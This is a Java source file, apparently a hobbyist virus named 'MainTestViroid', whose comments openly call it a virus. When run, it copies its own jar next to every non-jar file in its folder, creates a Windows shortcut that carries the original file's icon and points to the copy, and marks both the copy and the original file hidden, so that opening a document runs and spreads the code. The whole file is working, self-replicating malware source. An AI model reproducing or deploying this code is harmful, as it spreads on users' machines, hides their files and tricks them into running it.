import java.awt.Desktop;
import java.awt.image.BufferedImage;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.nio.file.Files;

import javax.swing.ImageIcon;
import javax.swing.filechooser.FileSystemView;

import mslinks.ShellLink;
import net.sf.image4j.codec.ico.ICOEncoder;

public class MainTestViroid {
	
	public static void main(String[] args) throws Exception {
		String SOURCE = new File(MainTestViroid.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getPath(); //Get my source
		
		File file = new File(SOURCE.substring(0, SOURCE.lastIndexOf('.'))); //Get my target file, this process relies on the name of this file, if it is ever changed, well, it won't work
		
		if(file.exists()) {
			Desktop.getDesktop().open(file); //Open my associated file
		}
		else {
			BufferedWriter bw = new BufferedWriter(new FileWriter(file)); //If I don't have one I must be virus prime, so write a new file!
			bw.write("");
			bw.close();
			Desktop.getDesktop().open(file); //Open my associated file
		}
		
		File folder = new File(new File(SOURCE).getParent());
		File[] listOfFiles = folder.listFiles();

		for (int i = 0; i < listOfFiles.length; i++) {
			File targetFile = listOfFiles[i];
		  if (targetFile.isFile()) {
		    try {
		    	String targetFilePath = targetFile.getPath();
		    	String extension = targetFilePath.substring(targetFilePath.lastIndexOf('.'));
		    	if(!extension.equals(".jar") && !extension.equals(".lnk") && !extension.equals(".ico")) { //Ignore jars, lnks, and icos
		    		
		    		File icon = new File(folder.getPath() + extension + ".ico"); //Check what would be the icon location
		    		
		    		if(!icon.exists()) { //If it doesn't exist, make it
		    			BufferedImage b = (BufferedImage) ( (ImageIcon) FileSystemView.getFileSystemView().getSystemIcon(targetFile)).getImage();
		    			ICOEncoder.write(b, icon);
		    			Files.setAttribute(icon.toPath(), "dos:hidden", true);//Hide the icon
		    		}
		    		
		    		
		    		File newDestination = new File(targetFilePath + ".jar");
		    		File thisVirus = new File(SOURCE);
		    		Files.copy(thisVirus.toPath(), newDestination.toPath()); //The actual copying process
		    		
		    		ShellLink s = ShellLink.createLink(newDestination.getPath())
							   .setIconLocation(icon.getPath());
		    		s.saveTo(targetFilePath + ".lnk"); //Actually create the lnk file
		    		
		    		Files.setAttribute(newDestination.toPath(), "dos:hidden", true);//Hide new virus
		    		Files.setAttribute(targetFile.toPath(), "dos:hidden", true);//Hide original file
		    	}
			} 
		    catch (Exception e) {}
		  }
		}
		
	}
	
}
